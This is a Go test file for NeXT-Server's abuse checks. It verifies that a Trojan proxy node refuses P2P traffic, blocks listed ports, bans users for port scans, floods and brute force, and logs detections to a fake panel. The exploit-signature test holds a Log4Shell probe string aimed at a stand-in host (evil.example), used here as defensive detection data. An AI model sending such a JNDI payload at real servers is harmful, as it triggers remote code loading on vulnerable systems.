package nextserver_test

import (
	"bytes"
	"context"
	"io"
	"net"
	"testing"
	"time"

	"github.com/The-NeXT-Project/NeXT-Server/option"

	"github.com/sagernet/sing/common/json/badoption"
	M "github.com/sagernet/sing/common/metadata"
	N "github.com/sagernet/sing/common/network"
)

// startAbuseNode runs a Trojan node, whose UDP sessions are full-cone, with
// the given abuse options, and returns a client for each test user.
func startAbuseNode(t *testing.T, abuse *option.AbuseOptions) (*fakePanel, N.Dialer, N.Dialer) {
	t.Helper()
	port := freePort(t)
	panel, panelServer := newFakePanel(t, 14, map[string]any{"offset_port_node": port, "host": "node.example.com"}, testUsers())
	startNextServer(t, panelServer.URL, func(options *option.ServerOptions) {
		options.Abuse = abuse
	})
	client := func(password string) N.Dialer {
		return startClient(t, map[string]any{"type": "trojan", "server": "127.0.0.1", "server_port": port, "password": password, "tls": insecureTLS()})
	}
	return panel, client(userUUID), client("6d5c2f4b-1f2e-4c6d-9a1b-2c3d4e5f6a7b")
}

// echoes reports whether payload comes back from destination through dialer.
func echoes(dialer N.Dialer, destination M.Socksaddr, payload []byte) bool {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	conn, err := dialer.DialContext(ctx, N.NetworkTCP, destination)
	if err != nil {
		return false
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(2 * time.Second))
	go conn.Write(payload)
	received := make([]byte, len(payload))
	_, err = io.ReadFull(conn, received)
	return err == nil && bytes.Equal(received, payload)
}

// udpEchoes sends payload on conn and reports whether it comes back.
func udpEchoes(conn net.PacketConn, destination M.Socksaddr, payload []byte, attempts int) bool {
	received := make([]byte, 2048)
	for attempt := 0; attempt < attempts; attempt++ {
		conn.WriteTo(payload, destination.UDPAddr())
		conn.SetReadDeadline(time.Now().Add(time.Second))
		n, _, err := conn.ReadFrom(received)
		if err == nil && bytes.Equal(received[:n], payload) {
			return true
		}
	}
	return false
}

func detectLogged(panel *fakePanel, userID int, ruleID int) func() bool {
	return func() bool {
		return panel.read(func(p *fakePanel) bool { return p.detectLogs[[2]int{userID, ruleID}] })
	}
}

func TestAbuseP2PRefused(t *testing.T) {
	tcpEcho, udpEcho := startEcho(t)
	panel, dialer, _ := startAbuseNode(t, &option.AbuseOptions{
		P2P: option.AbuseCheckOptions{RuleID: 21},
	})
	tcpDestination := M.ParseSocksaddrHostPort("127.0.0.1", uint16(tcpEcho))
	udpDestination := M.ParseSocksaddrHostPort("127.0.0.1", uint16(udpEcho))

	handshake := append([]byte("\x13BitTorrent protocol"), make([]byte, 48)...)
	if echoes(dialer, tcpDestination, handshake) {
		t.Fatal("BitTorrent handshake got through")
	}
	if echoes(dialer, tcpDestination, []byte("GET /announce?info_hash=%12%34&peer_id=-qB4650-abc HTTP/1.1\r\nHost: tracker\r\n\r\n")) {
		t.Fatal("tracker announce got through")
	}
	// An eDonkey server login: 0xE3, the length, opcode 0x01, a user hash,
	// client ID, port and no tags.
	login := append([]byte{0xE3, 27, 0, 0, 0, 0x01}, make([]byte, 26)...)
	if echoes(dialer, tcpDestination, login) {
		t.Fatal("eDonkey login got through")
	}
	if !echoes(dialer, tcpDestination, []byte("GET /index.html HTTP/1.1\r\nHost: example\r\n\r\n")) {
		t.Fatal("a plain HTTP request was refused")
	}

	dht := []byte("d1:ad2:id20:abcdefghij0123456789e1:q4:ping1:t2:aa1:y1:qe")
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	conn, err := dialer.ListenPacket(ctx, udpDestination)
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	// Mid-session BitTorrent packets are dropped, and the session carries on.
	if !udpEchoes(conn, udpDestination, []byte("hello"), 5) {
		t.Fatal("no udp echo")
	}
	if udpEchoes(conn, udpDestination, dht, 2) {
		t.Fatal("DHT packet got through")
	}
	if udpEchoes(conn, udpDestination, []byte{0xE4, 0x60}, 2) {
		t.Fatal("Kad ping got through")
	}
	if !udpEchoes(conn, udpDestination, []byte("again"), 3) {
		t.Fatal("the session ended after P2P packets")
	}

	eventually(t, 5*time.Second, "P2P detect log", detectLogged(panel, 1, 21))
}

func TestAbuseBlockedPorts(t *testing.T) {
	blockedTCP, blockedUDP := startEcho(t)
	openTCP, openUDP := startEcho(t)
	panel, dialer, _ := startAbuseNode(t, &option.AbuseOptions{
		BlockedPorts: option.AbuseBlockedPortsOptions{
			AbuseCheckOptions: option.AbuseCheckOptions{RuleID: 22},
			Ports:             []uint16{uint16(blockedTCP), uint16(blockedUDP)},
		},
	})
	refusedTCP(t, dialer, M.ParseSocksaddrHostPort("127.0.0.1", uint16(blockedTCP)))
	refusedUDP(t, dialer, M.ParseSocksaddrHostPort("127.0.0.1", uint16(blockedUDP)))
	echoTCP(t, dialer, M.ParseSocksaddrHostPort("127.0.0.1", uint16(openTCP)), 1024)
	echoUDP(t, dialer, M.ParseSocksaddrHostPort("127.0.0.1", uint16(openUDP)))
	eventually(t, 5*time.Second, "blocked port detect log", detectLogged(panel, 1, 22))
}

func TestAbusePortScanBans(t *testing.T) {
	tcpEcho, _ := startEcho(t)
	panel, dialer, otherDialer := startAbuseNode(t, &option.AbuseOptions{
		BanDuration: badoption.Duration(time.Minute),
		PortScan: option.AbusePortScanOptions{
			AbuseCheckOptions:  option.AbuseCheckOptions{RuleID: 23},
			FailedDestinations: 5,
		},
	})
	echo := M.ParseSocksaddrHostPort("127.0.0.1", uint16(tcpEcho))

	// A connection open before the scan is closed by the ban.
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	open, err := dialer.DialContext(ctx, N.NetworkTCP, echo)
	if err != nil {
		t.Fatal(err)
	}
	defer open.Close()
	open.SetDeadline(time.Now().Add(10 * time.Second))
	open.Write([]byte("ping"))
	if _, err = io.ReadFull(open, make([]byte, 4)); err != nil {
		t.Fatal(err)
	}

	for i := 0; i < 6; i++ {
		// Nothing listens there, so the node's dial is refused.
		refusedTCP(t, dialer, M.ParseSocksaddrHostPort("127.0.0.1", uint16(freePort(t))))
	}
	eventually(t, 5*time.Second, "the scanning user's ban", func() bool {
		return !echoes(dialer, echo, []byte("ping"))
	})
	if _, err = open.Read(make([]byte, 1)); err == nil {
		t.Fatal("a connection of the banned user stayed open")
	}
	if !echoes(otherDialer, echo, []byte("ping")) {
		t.Fatal("another user was refused")
	}
	eventually(t, 5*time.Second, "port scan detect log", detectLogged(panel, 1, 23))
}

func TestAbuseFloodBans(t *testing.T) {
	tcpEcho, udpEcho := startEcho(t)
	panel, dialer, otherDialer := startAbuseNode(t, &option.AbuseOptions{
		Flood: option.AbuseFloodOptions{
			AbuseCheckOptions:         option.AbuseCheckOptions{RuleID: 24},
			ConnectionsPerDestination: 10,
		},
	})
	echo := M.ParseSocksaddrHostPort("127.0.0.1", uint16(tcpEcho))
	for i := 0; i < 10; i++ {
		if !echoes(dialer, echo, []byte("ping")) {
			t.Fatal("refused at connection ", i+1, " of 10")
		}
	}
	if echoes(dialer, echo, []byte("ping")) {
		t.Fatal("the eleventh connection got through")
	}
	// The ban covers UDP and other destinations too, and only this user.
	refusedUDP(t, dialer, M.ParseSocksaddrHostPort("127.0.0.1", uint16(udpEcho)))
	if !echoes(otherDialer, echo, []byte("ping")) {
		t.Fatal("another user was refused")
	}
	eventually(t, 5*time.Second, "flood detect log", detectLogged(panel, 1, 24))
}

func TestAbuseBruteForceBans(t *testing.T) {
	tcpEcho, _ := startEcho(t)
	panel, dialer, otherDialer := startAbuseNode(t, &option.AbuseOptions{
		BruteForce: option.AbuseBruteForceOptions{
			AbuseCheckOptions:         option.AbuseCheckOptions{RuleID: 25},
			Ports:                     []uint16{uint16(tcpEcho)},
			ConnectionsPerDestination: 5,
		},
	})
	echo := M.ParseSocksaddrHostPort("127.0.0.1", uint16(tcpEcho))
	for i := 0; i < 5; i++ {
		if !echoes(dialer, echo, []byte("ping")) {
			t.Fatal("refused at login attempt ", i+1, " of 5")
		}
	}
	if echoes(dialer, echo, []byte("ping")) {
		t.Fatal("the sixth login attempt got through")
	}
	if !echoes(otherDialer, echo, []byte("ping")) {
		t.Fatal("another user was refused")
	}
	eventually(t, 5*time.Second, "brute force detect log", detectLogged(panel, 1, 25))
}

func TestAbuseSignaturesRefuse(t *testing.T) {
	tcpEcho, _ := startEcho(t)
	panel, dialer, _ := startAbuseNode(t, &option.AbuseOptions{
		Exploits: option.AbuseCheckOptions{RuleID: 26},
		Mining:   option.AbuseCheckOptions{RuleID: 27},
	})
	echo := M.ParseSocksaddrHostPort("127.0.0.1", uint16(tcpEcho))
	if echoes(dialer, echo, []byte("GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1\r\nHost: target\r\n\r\n")) {
		t.Fatal("Log4Shell probe got through")
	}
	if echoes(dialer, echo, []byte(`{"id":1,"method":"mining.subscribe","params":["cgminer/4.12.1"]}`+"\n")) {
		t.Fatal("Stratum login got through")
	}
	if !echoes(dialer, echo, []byte("GET /index.html?v=${version} HTTP/1.1\r\nHost: example\r\n\r\n")) {
		t.Fatal("a plain HTTP request was refused")
	}
	eventually(t, 5*time.Second, "exploit and mining detect logs", func() bool {
		return detectLogged(panel, 1, 26)() && detectLogged(panel, 1, 27)()
	})
}

func TestAbuseDisabled(t *testing.T) {
	tcpEcho, _ := startEcho(t)
	_, dialer, _ := startAbuseNode(t, &option.AbuseOptions{
		Disabled: true,
		Flood:    option.AbuseFloodOptions{ConnectionsPerDestination: 1},
	})
	echo := M.ParseSocksaddrHostPort("127.0.0.1", uint16(tcpEcho))
	if !echoes(dialer, echo, append([]byte("\x13BitTorrent protocol"), make([]byte, 48)...)) {
		t.Fatal("P2P refused with abuse checks disabled")
	}
	for i := 0; i < 3; i++ {
		echoTCP(t, dialer, echo, 64)
	}
}
